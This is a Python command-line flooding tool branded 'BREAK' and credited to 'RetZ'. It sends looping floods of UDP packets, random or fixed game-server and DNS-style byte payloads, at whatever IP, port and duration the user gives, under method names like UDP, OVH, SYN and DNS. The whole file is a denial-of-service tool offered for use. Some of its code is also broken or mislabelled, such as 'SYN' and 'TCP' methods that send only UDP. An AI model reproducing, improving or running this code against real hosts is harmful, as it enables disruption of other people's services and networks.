import sys, os, socket, time, threading, random

def randsender(ip, times, port, dmg):

  timeout = time.time() + float(times)
  sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
  sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

  sock.connect((ip, port))
  s.connect((ip, port))
  while time.time() < timeout:
    sock.sendto(dmg, (ip, int(port)))
    s.sendto(dmg, (ip, int(port)))
    s.send(dmg)
    s.send(dmg)
    s.send(dmg)
    s.send(dmg)
    s.send(dmg)
    s.send(dmg)
    s.send(dmg)
    s.send(dmg)
    s.send(dmg)
    s.send(dmg)
    sock.send(dmg)
    sock.send(dmg)
    sock.send(dmg)
    sock.send(dmg)
    sock.send(dmg)
    sock.send(dmg)
    sock.send(dmg)
    sock.send(dmg)
    sock.send(dmg)
    sock.send(dmg)

def stdsender(ip, times, port, payload):

  timeout = time.time() + float(times)
  sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

  while time.time() < timeout:
    sock.sendto(payload, (ip, int(port)))
    sock.sendto(payload, (ip, int(port)))
    sock.sendto(payload, (ip, int(port)))
    sock.sendto(payload, (ip, int(port)))
    sock.sendto(payload, (ip, int(port)))
    sock.sendto(payload, (ip, int(port)))
    sock.sendto(payload, (ip, int(port)))
    sock.sendto(payload, (ip, int(port)))
    sock.sendto(payload, (ip, int(port)))
    sock.sendto(payload, (ip, int(port)))

os.system("clear")
def main():
  try:
    method = str(sys.argv[1])
    ip = str(sys.argv[2])
    port = int(sys.argv[3])
    times = int(sys.argv[4])

    banner = f"""
\t\033[1;31;40m[ ================================================== ]
\t[ # ]                                            [ # ]
\t[ # ]\033[1;34;40m  ██████╗░██████╗░███████╗░█████╗░██╗░░██╗\033[1;31;40m  [ # ]
\t[ # ]\033[1;34;40m  ██╔══██╗██╔══██╗██╔════╝██╔══██╗██║░██╔╝\033[1;31;40m  [ # ]
\t[ # ]\033[1;34;40m  ██████╦╝██████╔╝█████╗░░███████║█████═╝░\033[1;31;40m  [ # ]
\t[ # ]\033[1;34;40m  ██╔══██╗██╔══██╗██╔══╝░░██╔══██║██╔═██╗░\033[1;31;40m  [ # ]
\t[ # ]\033[1;34;40m  ██████╦╝██║░░██║███████╗██║░░██║██║░╚██╗\033[1;31;40m  [ # ]
\t[ # ]\033[1;34;40m  ╚═════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝\033[1;31;40m  [ # ]
\t[ # ]                                            [ # ]
\t[ ================================================== ]
\n\n\t\t[ × ]=====\033[1;32;40m Code By RetZ\033[1;31;40m =====[ × ]
\t\t[ × ] \033[1;33;40mCreated At 30 Sep 2022 \033[1;31;40m[ × ]
\t\t[ × ]========================[ × ]\n\n
\t\t[ $ ]\033[1;32;40m METHOD      : {method}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m IP TARGET   : {ip}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {port}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIMES       : {times}\033[0m
"""

    if method == "UDP":
      try:
        socket.gethostbyname(ip)
        pack = 615
        dmg = random._urandom(int(pack))
        threading.Thread(target=randsender, args=(ip, times, port, dmg)).start()
        print(banner)
        time.sleep(times)
        os.system("clear")
      except ValueError:
        pass
      except socket.gaierror:
        pass
    elif method == "UDPV2":
      try:
        socket.gethostbyname(ip)
        pack = 65500
        dmg = random._urandom(int(pack))
        threading.Thread(target=randsender, args=(ip, times, port, dmg)).start()
        print(banner)
        time.sleep(times)
        os.system("clear")
      except ValueError:
        pass
      except socket.gaierror:
        pass
    elif method == "UDPV3":
      try:
        socket.gethostbyname(ip)
        payload = b"\0\x14\0\x01\x03"
        threading.Thread(target=stdsender, args=(ip, times, port, payload)).start()
        print(banner)
        time.sleep(times)
        os.system("clear")
      except ValueError:
        pass
      except socket.gaierror:
        pass
    elif method == "TCP":
      try:
        socket.gethostbyname(ip)
        pack = 4096
        dmg = random._urandom(int(pack))
        threading.Thread(target=randsender, args=(ip, times, port, dmg)).start()
        print(banner)
        time.sleep(times)
        os.system("clear")
      except ValueError:
        pass
      except socket.gaierror:
        pass
    elif method == "TCPV2":
      try:
        socket.gethostbyname(ip)
        payload = b"\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        threading.Thread(target=stdsender, args=(ip, port, times, payload)).start()
        print(banner)
        time.sleep(times)
        os.system("clear")
      except ValueError:
        pass
      except socket.gaierror:
        pass
    elif method == "TCPV3":
      try:
        socket.gethostbyname(ip)
        payload = b"\x55\x55\x55\x55\x00\x00\x00\x01"
        threading.Thread(target=stdsender, args=(ip, times, port, payload)).start()
        print(banner)
        time.sleep(times)
        os.system("clear")
      except ValueError:
        pass
      except socket.gaierror:
        pass
    elif method == "OVHV3":
      try:
        socket.gethostbyname(ip)
        payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        threading.Thread(target=stdsender, args=(ip, times, port, payload)).start()
        print(banner)
        time.sleep(times)
        os.system("clear")
      except ValueError:
        pass
      except socket.gaierror:
        pass
    elif method == "OVHV2":
      try:
        socket.gethostbyname(ip)
        payload = b"\x01\x01\x00\x01\x55\x03\x6f\x03\x1c\x03\x00\x00\x14\x14"
        threading.Thread(target=stdsender, args=(ip, times, port, payload)).start()
        print(banner)
        time.sleep(times)
        os.system("clear")
      except ValueError:
        pass
      except socket.gaierror:
        pass
    elif method == "OVH":
      try:
        socket.gethostbyname(ip)
        payload = b"\x00\x02\x00\x2f"
        threading.Thread(target=stdsender, args=(ip, times, port, payload)).start()
        print(banner)
        time.sleep(times)
        os.system("clear")
      except ValueError:
        pass
      except socket.gaierror:
        pass
    elif method == "OVHV4":
      try:
        socket.gethostbyname(ip)
        payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
        threading.Thread(target=stdsender, args=(ip, times, port, payload)).start()
        print(banner)
        time.sleep(times)
        os.system("clear")
      except ValueError:
        pass
      except socket.gaierror:
        pass
    elif method == "SYN":
      try:
        socket.gethostbyname(ip)
        payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
        threading.Thread(target=stdsender, args=(ip, times, port, payload)).start()
        print(banner)
        time.sleep(times)
        os.system("clear")
      except ValueError:
        pass
      except socket.gaierror:
        pass
    elif method == "SYNV2":
      try:
        socket.gethostbyname(ip)
        payload = b"\x01\x01\x00\x01\x55\x03\x6f\x03\x1c\x03\x00\x00\x14\x14"
        threading.Thread(target=stdsender, args=(ip, times, port, payload)).start()
        print(banner)
        time.sleep(times)
        os.system("clear")
      except ValueError:
        pass
      except socket.gaierror:
        pass
    elif method == "DNS":
      try:
        socket.gethostbyname(ip)
        payload = b"\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        threading.Thread(target=stdsender, args=(ip, times, port, payload)).start()
        print(banner)
        time.sleep(times)
        os.system("clear")
      except ValueError:
        pass
      except socket.gaierror:
        pass
    elif method == "FLOOD":
      try:
        socket.gethostbyname(ip)
        payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
        threading.Thread(target=stdsender, args=(ip, times, port, payload)).start()
        print(banner)
        time.sleep(times)
        os.system("clear")
      except ValueError:
        pass
      except socket.gaierror:
        pass
    elif method == "FLOODV2":
      try:
        socket.gethostbyname(ip)
        payload = b"\x55\x55\x55\x55\x00\x00\x00\x01"
        threading.Thread(target=stdsender, args=(ip, times, port, payload)).start()
        print(banner)
        time.sleep(times)
        os.system("clear")
      except ValueError:
        pass
      except socket.gaierror:
        pass
    elif method == "FLOODV3":
      try:
        socket.gethostbyname(ip)
        payload = b"\x1e\x00\x01\x30\x02\xfd\xa8\xe3\x00\x00\x00\x00\x00\x00\x00\x00"
        threading.Thread(target=stdsender, args=(ip, times, port, payload)).start()
        print(banner)
        time.sleep(times)
        os.system("clear")
      except ValueError:
        pass
      except socket.gaierror:
        pass
    elif method == "SYNV3":
      try:
        socket.gethostbyname(ip)
        payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
        threading.Thread(target=stdsender, args=(ip, times, port, payload)).start()
        print(banner)
        time.sleep(times)
        os.system("clear")
      except ValueError:
        pass
      except socket.gaierror:
        pass
    elif method == "SYNV4":
      try:
        socket.gethostbyname(ip)
        payload = b"\xff\xff\xff\xff\x67\x65\x74\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x30\x20\x22"
        threading.Thread(target=stdsender, args=(ip, times, port, payload)).start()
        print(banner)
        time.sleep(times)
        os.system("clear")
      except ValueError:
        pass
      except socket.gaierror:
        pass
    elif method == "DNSV2":
      try:
        socket.gethostbyname(ip)
        payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
        threading.Thread(target=stdsender, args=(ip, times, port, payload)).start()
        print(banner)
        time.sleep(times)
        os.system("clear")
      except ValueError:
        pass
      except socket.gaierror:
        pass
    elif method == "DNSV3":
      try:
        socket.gethostbyname(ip)
        payload = b"\x1e\x00\x01\x30\x02\xfd\xa8\xe3\x00\x00\x00\x00\x00\x00\x00\x00"
        threading.Thread(target=stdsender, args=(ip, times, port, payload)).start()
        print(banner)
        time.sleep(times)
        os.system("clear")
      except ValueError:
        pass
      except socket.gaierror:
        pass

  except:
    print("""\n\n\n
\t\t\t    ╔╗ ╦═╗╔═╗╔═╗╦╔═
\t\t\t    ╠╩╗╠╦╝║╣ ╠═╣╠╩╗
\t\t\t    ╚═╝╩╚═╚═╝╩ ╩╩ ╩
\t ╔═════════════════════════════════════════════════════╗
\t ║          UDP           ║ ║           OVH            ║
\t ║         UDPV2          ║ ║          OVHV2           ║
\t ║         UDPV3          ║ ║          OVHV3           ║
\t ║          TCP           ║ ║          OVHV4           ║
\t ║         TCPV2          ║ ║           DNS            ║
\t ║         TCPV3          ║ ║          DNSV2           ║
\t ║         FLOOD          ║ ║          DNSV3           ║
\t ║        FLOODV2         ║ ║           SYN            ║
\t ║        FLOODV3         ║ ║          SYNV2           ║
\t ║        [COMING         ║ ║          SYNV3           ║
\t ║          SOON]         ║ ║          SYNV4           ║
\t╔╩════════════════════════╝ ╚══════════════════════════╩╗
\t║         USAGE : [METHOD] [IP] [PORT] [TIME]           ║
\t╚═══════════════════════════════════════════════════════╝
\n\n""")

global times

if __name__ == '__main__':
  main()
